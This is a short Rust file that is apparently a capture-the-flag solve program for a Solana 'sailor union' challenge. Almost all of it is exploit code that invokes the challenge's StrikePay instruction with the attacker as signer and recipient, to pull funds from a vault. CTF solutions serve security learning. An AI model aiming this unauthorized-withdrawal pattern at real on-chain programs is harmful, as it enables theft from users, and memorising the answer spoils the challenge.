#[cfg(not(feature = "no-entrypoint"))]
pub mod entrypoint {
    use anchor_lang::prelude::*;
    use solana_program::{
        account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, instruction::Instruction,
        msg, program::invoke, pubkey::Pubkey,
    };

    use borsh::{BorshDeserialize, BorshSerialize};

    #[derive(Debug, Clone, BorshSerialize, PartialEq, Eq, PartialOrd, Ord)]
    pub enum SailorInstruction {
        CreateUnion(u64),
        PayDues(u64),
        StrikePay(u64),
        RegisterMember([u8; 32])
    }

    entrypoint!(process_instruction);

    #[derive(BorshDeserialize)]
    struct SolveInstruction {
        program: Pubkey,
    }

    pub fn process_instruction(
        _program_id: &Pubkey,
        accounts: &[AccountInfo],
        _instruction_data: &[u8],
    ) -> ProgramResult {
        let prog = accounts[0].clone();
        let hacker = accounts[1].clone();
        let vault = accounts[2].clone();
        let sailor_union = accounts[3].clone();
        let registration = accounts[4].clone();
        let rich_boi = accounts[5].clone();
        let system_program = accounts[6].clone();

        let amt = 100_000_000;

        msg!("solving program {}", prog.key);

        invoke(
            &Instruction::new_with_borsh(
                prog.key(),
                &SailorInstruction::StrikePay(amt),
                vec![
                    AccountMeta::new(registration.key(), false),
                    AccountMeta::new(hacker.key(), false),
                    AccountMeta::new_readonly(hacker.key(), true),
                    AccountMeta::new(vault.key(), false),
                    AccountMeta::new_readonly(system_program.key(), false),
                ],
            ),
            &[
                registration.clone(),
                hacker.clone(),
                hacker.clone(),
                vault.clone(),
                system_program.clone(),
            ],
        )?;
        
        msg!("done solving");

        Ok(())
    }
}
